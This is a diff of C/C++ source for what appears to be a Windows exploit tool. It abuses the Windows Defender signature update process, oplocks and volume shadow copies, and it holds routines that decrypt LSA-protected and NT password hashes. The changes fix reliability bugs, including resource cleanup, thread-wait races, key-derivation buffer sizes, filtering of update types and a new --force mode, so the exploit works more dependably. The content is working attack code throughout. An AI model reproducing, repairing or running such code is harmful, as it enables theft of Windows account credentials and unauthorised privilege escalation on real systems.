@@ -685,7 +685,7 @@ UpdateFiles* GetUpdateFiles(int* filecount = NULL)
 	InternetCloseHandle(hint);
 	hint = NULL;
 	InternetCloseHandle(hint2);
-	hint = NULL;
+	hint2 = NULL;
 	printf("Done.\n");
 	mappedbuff = GetCabFileFromBuff((PIMAGE_DOS_HEADER)exebuff, sz, &ressz);
 
@@ -959,6 +959,33 @@ bool CheckForWDUpdates(wchar_t* updatetitle, bool* criterr)
 
 		}
 		updatesfound = IsWdUdpate && IsSigUpdate;
+
+		// Filter out platform/engine updates — the downloaded mpam-fe.exe contains
+		// signature definition files (.vdm), so the RPC call ServerMpUpdateEngineSignature
+		// will reject them with 0x8050A003 if the pending update is actually a platform
+		// update (KB4052623) rather than a signature update (KB2267602).
+		// Platform updates contain "antimalware platform" in the title.
+		// Signature updates contain "Security Intelligence" in the title.
+		if (updatesfound && title)
+		{
+			bool IsPlatformUpdate = wcsstr(title, L"antimalware platform") != NULL ||
+				wcsstr(title, L"Antimalware Platform") != NULL ||
+				wcsstr(title, L"antimalware Platform") != NULL;
+			bool IsSignatureUpdate = wcsstr(title, L"Security Intelligence") != NULL ||
+				wcsstr(title, L"Definition") != NULL;
+
+			if (IsPlatformUpdate)
+			{
+				printf("Skipping platform update: %ws\n", title);
+				updatesfound = false;
+			}
+			else if (!IsSignatureUpdate)
+			{
+				printf("Skipping non-signature update: %ws\n", title);
+				updatesfound = false;
+			}
+		}
+
 		if (updatesfound)
 			break;
 	}
@@ -1293,6 +1320,7 @@ scanagain:
 
 	if (!srchfound) {
 		restartscan = true;
+		Sleep(50);
 		goto scanagain;
 	}
 	if (objdirinfo) {
@@ -1693,6 +1721,12 @@ bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
 	GetOverlappedResult(hlock, &ovd, &nwf, TRUE);
 	printf("Oplock triggered.\n");
 
+	// Wait for the VSS finder thread to finish before checking its exit code.
+	// Without this, GetExitCodeThread can return STILL_ACTIVE (259) if the
+	// thread is between its last print and its return statement.
+	printf("Waiting for VSS finder thread to complete...\n");
+	WaitForSingleObject(hthread, 30000);
+
 	if (!GetExitCodeThread(hthread, &exitcode))
 	{
 		printf("Unexpected error while getting worker thread exit code");
@@ -1701,10 +1735,10 @@ bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
 	}
 	if (exitcode)
 	{
-		printf("Failed to get new volume shadow copy path");
+		printf("Failed to get new volume shadow copy path, thread exit code: %d\n", exitcode);
 		retval = false;
 		goto cleanup;
-	
+
 	}
 
 
@@ -1861,25 +1895,10 @@ void* UnprotectAES(char* lsaKey, char* iv, char* hashdata, unsigned long enclen,
 	DWORD retsz = enclen;
 
 	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)decrypted, &retsz);
-	
 
-	/*
-	EVP_CIPHER_CTX* en = EVP_CIPHER_CTX_new();
+	CryptDestroyKey(hcryptkey);
+	CryptReleaseContext(hprov, NULL);
 
-	int fulllen = 0;
-	int retval = EVP_DecryptInit(en, EVP_aes_128_cbc(), (const unsigned char*)lsaKey, (const unsigned char*)iv);
-	if (!retval)
-		return NULL;
-
-	//int decryptedsz = enclen;
-	retval = EVP_DecryptUpdate(en, (unsigned char*)decrypted, (int*)&enclen, (const unsigned char*)hashdata, enclen);
-	if (!retval)
-		return NULL;
-	retval = EVP_DecryptFinal_ex(en, (unsigned char*)decrypted + enclen, &fulllen);
-	EVP_CIPHER_CTX_free(en);
-	if (!retval)
-		return NULL;
-	*/
 	if (decryptedlen)
 		*decryptedlen = retsz;
 
@@ -2059,7 +2078,7 @@ void* UnprotectDES(char* key, int keysz, char* ciphertext, int ciphertextsz, int
 	if (outsz)
 		*outsz = 8;
 
-	//printf("GetLastError : %x\n", GetLastError());
+	CryptDestroyKey(hcryptkey);
 	CryptReleaseContext(hprov, NULL);
 	return ciphertext2;
 
@@ -2100,7 +2119,7 @@ void* UnprotectDES(char* key, int keysz, char* ciphertext, int ciphertextsz, int
 
 char* DeriveDESKey(char data[7])
 {
-
+	const int DATA_LEN = 7;
 
 	union keyderv {
 		struct {
@@ -2110,11 +2129,11 @@ char* DeriveDESKey(char data[7])
 	};
 	keyderv ttv = { 0 };
 	ZeroMemory(ttv.arr, sizeof(ttv.arr));
-	memmove(ttv.arr, data, sizeof(data) - 1);
+	memmove(ttv.arr, data, DATA_LEN);
 	SIZE_T k = ttv.derv;
 
 
-	char* key = (char*)malloc(sizeof(data));
+	char* key = (char*)malloc(8);
 
 	for (int i = 0; i < 8; i++)
 	{
@@ -2185,7 +2204,7 @@ void* UnprotectNTHash(char* key, int keysz, char* encryptedHash, int enchashsz, 
 unsigned char* HexToHexString(unsigned char* data, int size)
 {
 	unsigned char* retval = (unsigned char*)malloc(size * 2 + 1);
-	ZeroMemory(retval, size + 1);
+	ZeroMemory(retval, size * 2 + 1);
 	for (int i = 0; i < size; i++)
 	{
 		sprintf((char*)&retval[i * 2], "%02x", data[i]);
@@ -3033,16 +3052,38 @@ int wmain(int argc, wchar_t* argv[])
 
 	try {
 
-		printf("Checking for windows defender signature updates...\n");
-		while (!CheckForWDUpdates(updtitle, &criterr)){
-
-			if (criterr)
-				goto cleanup;
-			printf("No updates found for windows defender. Recheking in 30 seconds...\n");
-			Sleep(30000);
-
+		// Check for --force flag to skip Windows Update API check
+		bool forceMode = false;
+		for (int i = 1; i < argc; i++)
+		{
+			if (_wcsicmp(argv[i], L"--force") == 0)
+			{
+				forceMode = true;
+				break;
+			}
 		}
-		printf("Found Update : \n%ws\n", updtitle);
+
+		if (forceMode)
+		{
+			printf("Force mode enabled — skipping Windows Update API check.\n");
+			printf("Downloading update files directly from Microsoft CDN...\n");
+		}
+		else
+		{
+			printf("Checking for windows defender signature updates...\n");
+			printf("NOTE: Only signature/definition updates (KB2267602) are supported.\n");
+			printf("      Platform updates (KB4052623) will be skipped.\n");
+			printf("      Use --force to skip this check entirely.\n\n");
+			while (!CheckForWDUpdates(updtitle, &criterr)) {
+
+				if (criterr)
+					goto cleanup;
+				printf("No signature definition updates found. Rechecking in 30 seconds...\n");
+				Sleep(30000);
+
+			}
+			printf("Found Update : \n%ws\n", updtitle);
+		}
 
 		UpdateFilesList = GetUpdateFiles();
 		if (!UpdateFilesList)
@@ -3377,14 +3418,10 @@ cleanup:
 
 	if(hint)
 		InternetCloseHandle(hint);
-	if(hint)
+	if(hint2)
 		InternetCloseHandle(hint2);
 	if (exebuff)
 		free(exebuff);
-	if(mappedbuff)
-		UnmapViewOfFile(mappedbuff);
-	if (hmapping)
-		CloseHandle(hmapping);
 	if (hcabctx)
 		FDIDestroy(hcabctx);
 	if (hdir)
